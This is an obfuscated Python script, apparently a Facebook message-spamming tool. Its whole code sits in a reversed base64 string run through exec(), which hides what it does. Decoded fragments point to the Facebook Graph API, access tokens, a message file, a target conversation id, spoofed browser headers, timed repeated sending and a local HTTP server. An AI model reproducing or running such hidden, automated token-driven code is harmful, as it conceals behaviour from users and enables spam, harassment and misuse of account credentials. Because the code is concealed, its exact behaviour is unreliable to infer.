# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Sat Feb  3 05:12:44 2024
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'==QKo4Wah1GIgACIKozJf9lbpFWbf91Jg0TPg81Xl1WYu91XgYWaKoQKoUGbpZ2Xt9mcm91cldWYzNXZt9FZuV2cgACIgoAcv9GbgcmbpRmblNHIldWYzNXZtBSZoRHIoRXa3BSZ15Wa052bjBCLuVGaUByIgACIgogCKMnblt2b0BCbsFGIn5WazVHIElEIkVWaml2YlB3cgUGa0Byb0BSZnF2czVWbgwWYpRXaulGIlhGdgQmblNFIjACIgAiCKkCK0JXY0NnLkFWZyhGdfJXZ2JXZzBCIgAiCpIXZ2JXZz9VZ0V3YlhXZ9QXZnJXY0hCZhVmcoRlLn5WakFWZyhGdg0DIkFWZyhGdfJXZ2JXZzBCIgAiC6kCKulWYtBiZlRmCKkSKlhCdh1mcvZmLi03egoDZlJnc1N2YvBicvJnclBibBBSXhslIoQnbpJHcgACIgACIgACIgACIKoTZgMXYg42bpRHclNGeFBCdwV2Y4VGIgACIgACIgoQKi4GXu4iLzNXZj9mcwBSZoRHIn5Wa0JXY0NXZSBiL05WZzBycldWYzNXZtBCbsFEIdtyWuxlIoQnbpJHcgACIgACIgACIgACIKoQKkVWZwNHKwVWZsNnLl1Wa0BCIgACIgACIgACIgACIgAiCpgyczVmbpxGIgACIgACIgACIgACIgACIgACIgoQKoM3cl5WasBCIgACIgACIgACIgACIgACIgACIKkSKldWYzNXZtByKgcCInAyKgUWbh52XzJXZ0FGagwSMgsCI4VGZul2XuV2avRHIsQWaf9mdu92YgwSMgsCI4VGZul2XldWYzNXZtBCIgACIgACIgACIgACIgACIgACIgACIgoAK0FWby9mZuISf7BiO9tHIuV2avRFIoRXa3BSf7Byb252bDBiZvBSf7BSZnF2czVWTgQmblNHIvRHIkVGbpFmRg0Feb1WM5sTMbNzMwwlIoQnbpJHcgACIgACIgACIgACIgACIgACIgAiC6U2csVGIgACIgACIgACIgACIgACIKkCKzNXZulGbgACIgACIgACIgACIgACIgACIgAiCpgyczVmbpxGIgACIgACIgACIgACIgACIgACIgoQKpU2ZhN3cl1GIrAyJgcCIrASZtFmbfNnclRXYoBCLxAyKggXZk5Waf5WZr9GdgwCZp91b252bjBCLxAyKggXZk5WafV2ZhN3cl1GIgACIgACIgACIgACIgACIgACIgACIgAiCoQXYtJ3bm5iI9tHI603eg4WZr9GVg03eg8mdu92QgY2bg03egU2ZhN3ch1EIhl3RgEGboNEIuFGSg01Kb1mM5sTMbNzMwwlIoQnbpJHcgACIgACIgACIgACIgACIgACIgAiC6s2buU2cu9GczVmcgYWagACIgACIgACIgACIgACIgoQKiAXJgMVJ60UJ6kUJgQWJt0WJtkVJg4TP9ASahhEIphWYT1mM5sTMbNzMwwlIoUWbpRnZyR3cuUWbpRHI9ASZtlGdfRnblJnc1NGIgACIgACIgACIgACIgACIKoQKzJXZkFWZo1zcyVGZhVGagwycyVGdl1WYyFGc942bzpGIswmc1hCdz9GcuMHdzVWdxVmcg0DIlNnbvB3clJHIgACIgACIgACIgACIgACIK0XZnF2czVWbgsCInAyJgsCIl1WYu91cyVGdhhGI6cSZnF2czVWbnACLuV2avR3XzNXZjNWYgozJuV2avR3XzNXZjNWYnsHI9AycyVGdl1WYyFGcgACIgACIgACIgACIgACIgoQKkl2XvZnbvNGIrAyJfR3JoQXYtJ3bm5iIv03evAjL3Ejdv02bj5yav9mYlNWYm5CawFmcn9yL6MHc0RHaiASPgwmc1BCIgACIgACIgACIgACIgAiCKkCKwlmc0NnLdhXZk5WafV2ZhN3cl12WzV2ZhN3cl1GI9ASZnF2czVWbgACIgACIgACIgACIgACIgogCpgCcpJHdz5SX4VGZul2XuV2avR3Wz5WZr9Gdg0DIuV2avR3XzNXZjNWYgACIgACIgACIgACIgACIgowcuV2avR3X4FWbgUCI4VGZul2XldWYzNXZtBSPggXZk5Waf5WZr9GdgACIgACIgACIgACIgACIgogOpMXZnF2czVWbf1WduhSZn5WYyBibpBCelRmbp9VZnF2czVWbgI3bmBCIgACIgACIgACIgogO5JHdgACIgACIgAiC6UWdyRFIlxWaodHIgACIKoQfgACIgowJt92YuUGbn92bn5yd3d3JgozJyVmclZWZydCIgACIgACIgoALngjLw0Tc7InZskjLw0Tc74WZsMVVt4WZnAiOnU2ZhV3ZuFGTtQHclN2YBdCIgACIgACIgoALnUGdhxmZlRGIsAXa6d2JgozJn5Wak9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'))
